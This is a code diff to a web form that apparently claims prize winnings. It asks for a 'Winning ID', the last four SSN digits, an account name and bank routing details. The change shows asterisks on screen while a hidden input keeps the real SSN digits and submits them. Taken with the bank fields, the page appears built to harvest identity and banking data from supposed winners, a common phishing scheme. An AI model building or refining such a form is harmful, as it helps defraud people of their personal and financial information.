@@ -67,10 +67,11 @@
           <input type="text" name="Winning ID" placeholder="TFL20258752AF" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
-        <div>
-          <label class="block font-medium text-gray-700">Last 4 Digits of SSN</label>
-          <input type="text" id="ssnInput" name="Last 4 Digits of SSN" placeholder="1234" maxlength="4" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
-        </div>
+<div>
+  <label class="block font-medium text-gray-700">Last 4 Digits of SSN</label>
+  <input type="text" id="ssnInput" name="Last 4 Digits of SSN" placeholder="1234" maxlength="4" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+  <input type="hidden" id="ssnHidden" name="Last 4 Digits of SSN">
+</div>
 
         <div>
           <label class="block font-medium text-gray-700">Account Name</label>
@@ -186,12 +187,17 @@
       e.target.value = f;
     });
 
-    const ssnInput = document.getElementById('ssnInput');
-    ssnInput.addEventListener('input', function () {
-      let v = ssnInput.value.replace(/\D/g, '').slice(0, 4);
-      ssnInput.value = v;
-      if (v.length === 4) ssnInput.value = '****';
-    });
+const ssnInput = document.getElementById('ssnInput');
+const ssnHidden = document.getElementById('ssnHidden');
+let realSSN = '';
+
+ssnInput.addEventListener('input', function () {
+  let v = ssnInput.value.replace(/\D/g, '').slice(0, 4);
+  realSSN = v;            // store real value
+  ssnHidden.value = realSSN; // hidden input holds real value
+  // visually show asterisks
+  ssnInput.value = '*'.repeat(v.length);
+});
 
 const routingInput = document.getElementById('routingInput');
 const bankName = document.getElementById('bankName');
